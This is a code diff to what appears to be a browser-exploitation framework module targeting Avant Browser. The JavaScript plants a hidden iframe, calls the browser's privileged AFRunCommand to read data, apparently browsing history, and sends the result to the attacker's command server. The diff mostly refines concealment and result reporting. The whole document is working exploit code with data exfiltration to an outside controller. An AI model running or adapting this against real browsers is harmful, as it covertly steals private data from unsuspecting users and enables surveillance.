@@ -15,37 +15,33 @@
 //
 beef.execute(function() {
 
-	
+	if (!beef.browser.isA()) {
+		beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Exploit failed. Target browser is not Avant Browser.");
+		return;
+	}
 
 	var avant_iframe = document.createElement("iframe");
 	//var avant_iframe = beef.dom.createInvisibleIframe();
-	avant_iframe.setAttribute('src', "browser:home");
-	avant_iframe.setAttribute('name','test2');
-	avant_iframe.setAttribute('width','0');
-	avant_iframe.setAttribute('heigth','0');
+	avant_iframe.setAttribute('src',      'browser:home');
+	avant_iframe.setAttribute('name',     'avant_history_<%= @command_id %>');
+	avant_iframe.setAttribute('width',    '0');
+	avant_iframe.setAttribute('heigth',   '0');
 	avant_iframe.setAttribute('scrolling','no');
+	avant_iframe.setAttribute('style',    'display:none');
 
 	document.body.appendChild(avant_iframe);
 
 	var vstr = {value: ""};
 
-	if(window['test2'].navigator) {
-	//This works if FF is the rendering engine
-	window['test2'].navigator.AFRunCommand(<%= @cId %>, vstr);
-	beef.net.send("<%= @command_url %>", <%= @command_id %>, vstr.value);
-
+	if (window['avant_history_<%= @command_id %>'].navigator) {
+		//This works if FF is the rendering engine
+		window['avant_history_<%= @command_id %>'].navigator.AFRunCommand(<%= @cId %>, vstr);
+		beef.net.send("<%= @command_url %>", <%= @command_id %>, "result="+vstr.value);
+	} else {
+		// this works if Chrome is the rendering engine
+		//window['avant_history_<%= @command_id %>'].AFRunCommand(60003, vstr);
+		beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Exploit failed. Rendering engine is not set to Firefox.");
 	}
-	else {
-	// this works if Chrome is the rendering engine
-	//window['test2'].AFRunCommand(60003, vstr);
-	beef.net.send("<%= @command_url %>", <%= @command_id %>, "Exploit failed. Rendering engine is not set to Firefox");	
-
-	}
-	
-
-	
-
-	
 
 });
 
